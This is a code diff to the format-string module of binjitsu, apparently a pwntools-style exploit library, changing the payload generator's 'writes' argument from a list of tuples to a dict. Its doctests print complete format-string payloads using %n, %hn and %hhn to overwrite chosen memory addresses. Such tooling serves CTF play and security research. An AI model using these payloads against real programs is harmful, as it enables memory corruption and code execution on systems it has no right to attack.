@@ -5,11 +5,11 @@ Example - Payload generation
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
 ::
-
+    # TODO full example with gcc cf https://github.com/binjitsu/binjitsu/pull/41#discussion_r32895981
     # we want to do 3 writes
-    writes = [(0x08041337,   0xbfffffff),
-              (0x08041337+4, 0x1337babe),
-              (0x08041337+8, 0xdeadbeef)]
+    writes = {0x08041337:   0xbfffffff,
+              0x08041337+4: 0x1337babe,
+              0x08041337+8: 0xdeadbeef}
 
     # the printf() call already writes some bytes
     # for example :
@@ -63,27 +63,26 @@ def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte'):
 
     Arguments:
         offset(int): the first formatter's offset you control
-        writes(list): list of tuple, each tuple must be composed as ``(where, what)``
+        writes(dict): dict with addr, value ``{addr: value, addr2: value2}``
         numbwritten(int): number of byte already written by the printf function
-        write_size(str): must be 'byte', 'short', 'int'. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)
-
+        write_size(str): must be ``byte``, ``short`` or ``int``. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)
     Returns:
         The payload in order to do needed writes
 
     Examples:
         >>> context.clear(arch = 'amd64')
-        >>> print repr(fmtstr_payload(1, [(0x0, 0x1337babe)], write_size='int'))
+        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
         '\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00%322419374c%1$n%3972547906c%2$n'
-        >>> print repr(fmtstr_payload(1, [(0x0, 0x1337babe)], write_size='short'))
+        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
         '\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00%47774c%1$hn%22649c%2$hn%60617c%3$hn%4$hn'
-        >>> print repr(fmtstr_payload(1, [(0x0, 0x1337babe)], write_size='byte'))
+        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
         '\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00%126c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn%237c%5$hhn%6$hhn%7$hhn%8$hhn'
         >>> context.clear(arch = 'i386')
-        >>> print repr(fmtstr_payload(1, [(0x0, 0x1337babe)], write_size='int'))
+        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
         '\x00\x00\x00\x00%322419386c%1$n'
-        >>> print repr(fmtstr_payload(1, [(0x0, 0x1337babe)], write_size='short'))
+        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
         '\x00\x00\x00\x00\x02\x00\x00\x00%47798c%1$hn%22649c%2$hn'
-        >>> print repr(fmtstr_payload(1, [(0x0, 0x1337babe)], write_size='byte'))
+        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
         '\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00%174c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn'
 
     """
@@ -105,13 +104,13 @@ def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte'):
 
     # add wheres
     payload = ""
-    for where, what in writes:
+    for where, what in writes.items():
         for i in range(0, number*step, step):
             payload += pack(where+i)
 
     numbwritten += len(payload)
     fmtCount = 0
-    for where, what in writes:
+    for where, what in writes.items():
         for i in range(0, number):
             current = what & mask
             if numbwritten & mask <= current:
@@ -170,7 +169,7 @@ class FmtStr(object):
             self.offset, self.padlen = self.find_offset()
             log.info("Found format string offset: %d", self.offset)
 
-        self.writes = []
+        self.writes = {}
         self.leaker = MemLeak(self._leaker)
 
     def leak_stack(self, offset, prefix=""):
@@ -226,7 +225,7 @@ class FmtStr(object):
         fmtstr = randoms(self.padlen)
         fmtstr += fmtstr_payload(self.offset, self.writes, numbwritten=self.padlen, write_size='byte')
         self.execute_fmt(fmtstr)
-        self.writes = []
+        self.writes = {}
 
     def write(self, addr, data):
         """write(addr, data) -> None
@@ -241,4 +240,4 @@ class FmtStr(object):
             None
 
         """
-        self.writes.append((addr, data))
+        self.writes[addr] = data
